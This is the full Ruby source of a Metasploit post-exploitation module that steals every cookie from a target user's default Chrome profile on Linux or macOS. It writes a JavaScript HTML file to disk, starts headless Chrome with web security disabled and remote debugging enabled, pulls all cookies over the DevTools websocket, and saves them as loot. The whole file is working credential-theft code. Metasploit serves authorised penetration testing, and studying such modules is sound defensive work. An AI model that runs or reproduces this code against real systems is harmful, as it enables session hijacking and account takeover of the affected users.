##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  GET_ALL_COOKIES_REQUEST = '{"id": 1, "method": "Network.getAllCookies"}'.freeze

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Chrome Gather Cookies',
      'Description' => "
      Read all cookies from the Default Chrome profile of the target user.
      ",
      'License' => MSF_LICENSE,
      'Author' => ['mangopdf <mangodotpdf[at]gmail.com>'],
      'Platform' => %w[linux unix bsd osx],
      'SessionTypes' => %w[meterpreter shell]))

    register_options(
      [
        OptString.new('CHROME_BINARY_PATH', [false, "The path to the user's Chrome binary (leave blank to use the default for the OS)", '']),
        OptString.new('TEMP_STORAGE_DIR', [false, 'Where to write the html used to steal cookies temporarily', '/tmp']),
        OptInt.new('REMOTE_DEBUGGING_PORT', [false, 'Port on target machine to use for remote debugging protocol', 9222])
      ]
    )
  end

  def configure_for_platform
    vprint_status('Determining session platform')
    vprint_status("Platform: #{session.platform}")
    vprint_status("Type: #{session.type}")

    case session.platform
    when 'unix', 'linux', 'bsd', 'python'
      @platform = :unix
      @chrome = 'google-chrome'
      @user_data_dir = "/home/#{session.username}/.config/google-chrome/"
    when 'osx'
      @platform = :osx
      @chrome = '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'
      @user_data_dir = expand_path "/Users/#{session.username}/Library/Application Support/Google/Chrome"
    when 'windows'
      print_error "Windows isn't supported by this module. See github.com/defaultnamehere/cookie_crimes for manual instructions."
      @platform = :windows
      return
    else
      fail_with Failure::NoTarget, "Unsupported platform: #{session.platform}"
    end

    unless datastore['CHROME_BINARY_PATH'].empty?
      @chrome = datastore['CHROME_BINARY_PATH']
    end

    @retries = datastore['MAX_RETRIES']
    @temp_storage_dir = datastore['TEMP_STORAGE_DIR']

    unless writable? @temp_storage_dir
      fail_with Failure::BadConfig, "#{@temp_storage_dir} is not writable"
    end

    @html_storage_path = create_cookie_stealing_html

    @chrome_debugging_cmd = "#{@chrome} --headless --disable-web-security --disable-plugins --user-data-dir=\"#{@user_data_dir}\" --remote-debugging-port=#{datastore['REMOTE_DEBUGGING_PORT']} #{@html_storage_path}"

    nil
  end

  def create_cookie_stealing_html
    cookie_stealing_html = %(
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="utf-8">
        <title>index.html</title>
      </head>
      <body>
          <script>

              var remoteDebuggingPort = #{datastore['REMOTE_DEBUGGING_PORT']};
              var request = new XMLHttpRequest();
              request.open("GET", "http://localhost:" + remoteDebuggingPort + "/json");
              request.responseType = 'json';
              request.send();

              request.onload = function() {
                var webSocketDebuggerUrl = request.response[0].webSocketDebuggerUrl;
                console.log(webSocketDebuggerUrl);
                var connection = new WebSocket(webSocketDebuggerUrl);

                connection.onopen = function () {
                  connection.send('{"id": 1, "method": "Network.getAllCookies"}');
                };

                connection.onmessage = function (e) {
                  var cookies_blob = JSON.stringify(JSON.parse(e.data).result.cookies);
                  console.log('REMOTE_DEBUGGING|' + cookies_blob);
                };
              }
          </script>
      </body>
      </html>
    )

    # Where to temporarily store the cookie-stealing html
    html_storage_path = File.join @temp_storage_dir, Rex::Text.rand_text_alphanumeric(10..15)
    write_file html_storage_path, cookie_stealing_html
    html_storage_path
  end

  def cleanup_html
    rm_f @html_storage_path
  end

  def get_cookies
    chrome_output = cmd_exec @chrome_debugging_cmd

    print_status "Activated Chrome's Remote Debugging via #{@chrome_debugging_cmd}"

    # Parse out the cookies from Chrome's output
    cookies_pattern = /REMOTE_DEBUGGING|\[.*\]/m
    cookies_msg = cookies_pattern.match(chrome_output).to_s

    # Slice off the "REMOTE_DEBUGGING|" delimiter, and join the cookies back together (cookies may contain "|").
    cookies_json = cookies_msg.split("|")[1..-1].join("|")

    cookies_json
  end

  def save(msg, data, ctype = 'text/json')
    ltype = 'chrome.gather.cookies'
    loot = store_loot ltype, ctype, session, data, nil, msg
    print_good "#{msg} stored in #{loot}"
  end

  def run
    fail_with Failure::BadConfig, 'No session found, giving up' if session.nil?

    configure_for_platform
    cookies = get_cookies
    cookies_parsed = JSON.parse cookies
    save "#{cookies_parsed.length} Chrome Cookies", cookies
    cleanup_html
  end
end
